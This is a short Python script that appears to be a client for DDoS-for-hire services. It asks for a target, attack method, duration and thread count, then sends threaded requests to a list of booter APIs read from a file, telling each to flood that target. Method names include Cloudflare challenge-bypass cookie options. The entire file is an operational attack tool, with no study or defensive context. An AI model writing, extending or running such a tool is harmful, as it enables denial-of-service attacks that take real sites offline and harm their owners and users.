import requests,threading
from urllib.parse import urlparse

def reads_api():
    with open('API.txt','r') as f:return f.read().split('\n')

def api_sender(links,opt):
 try:
    r = requests.get(links,headers=opt)
 except Exception as e:print(e)

headers = {}
https = ['BROWSER','HANDSHAKE','AMP','MURD-OPT','RAPID-FAST','MURD','COOKIE2','COOKIE']
print(f'HTTP-19, {", ".join(https)}')
methods = input("Methods ?")
hostname = input("Target ?")
scheme = ''
ports = 80
proxy = ''
links = ''
if methods.upper() in https:
   parsed_url = urlparse(hostname)
   hostname = parsed_url.hostname
   scheme = parsed_url.scheme
   links = parsed_url.path or '/'
if methods.upper() == 'BROWSER':
   proxy = input("Type None SOCKS5 SOCKS4 HTTP HTTPS ?")
elif methods.upper() in ['COOKIE', 'COOKIE2']:
   print('URL __cf_chl_tk,__cf_chl_rt_tk,__cf_chl_f_tk,__cf_chl_captcha_tk__,__cf_chl_managed_tk__,__cf_chl_jschl_tk__')
   proxy = input("Type OPT 0-6 ?")
if methods.upper() == 'HTTP-19':
   ports = int(input("Ports ?"))
meth_http = input("HTTP-METHODS GET, POST and etc ?")
times = int(input("TIMES ?"))
th = int(input("THREAD ?"))
a = f'target={hostname}&time={times}&threads={th}&methods={methods}'
opt = {'X-Port':str(ports),'X-Methods':meth_http,'X-Protocols':scheme,'X-Links':links,'X-Browser':proxy}
for a2 in reads_api():
   threading.Thread(target=api_sender,args=(a2+a,opt)).start()
